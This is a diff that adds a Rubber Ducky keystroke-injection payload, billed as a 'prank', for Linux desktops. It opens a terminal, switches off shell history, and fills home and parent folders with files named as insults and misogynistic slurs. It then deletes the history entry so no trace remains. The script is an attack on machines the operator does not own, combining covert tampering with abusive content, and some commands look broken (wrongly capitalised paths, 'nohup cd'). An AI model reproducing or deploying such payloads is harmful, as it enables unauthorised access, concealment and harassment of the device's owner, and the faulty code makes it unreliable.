@@ -1,0 +1,26 @@
+REM Title: File bomb word list tux style
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, strippers and memes
+REM Version: 1.0
+REM Category: Prank
+REM changes to all the main dir's in home, then home, then root and creates negative named files in each
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+REM adjust delay as needed
+DELAY 1500
+REM sneak +1 don't delete the whole history or mess with size settings, just turn history off and delete the history change entry ;)
+STRING set +o history
+DELAY 200
+ENTER
+DELAY 200
+STRING nohup cd /Home/Pictures && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd /Home/Documents && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd /Home/Music && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd /Home/Videos && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd /Home/Desktop && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick >/dev/null && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
+DELAY 500
+ENTER
+DELAY 300
+ALT F4
